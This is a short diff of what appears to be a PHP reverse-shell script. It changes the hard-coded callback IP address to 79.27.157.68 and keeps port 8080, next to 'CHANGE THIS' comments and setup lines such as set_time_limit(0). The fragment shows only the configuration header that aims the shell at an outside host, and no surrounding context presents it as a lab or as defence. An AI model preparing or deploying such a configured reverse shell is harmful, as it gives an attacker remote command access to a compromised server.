@@ -1,7 +1,7 @@
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '187.15.3.17';  // CHANGE THIS
+$ip = '79.27.157.68';  // CHANGE THIS
 $port = 8080;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
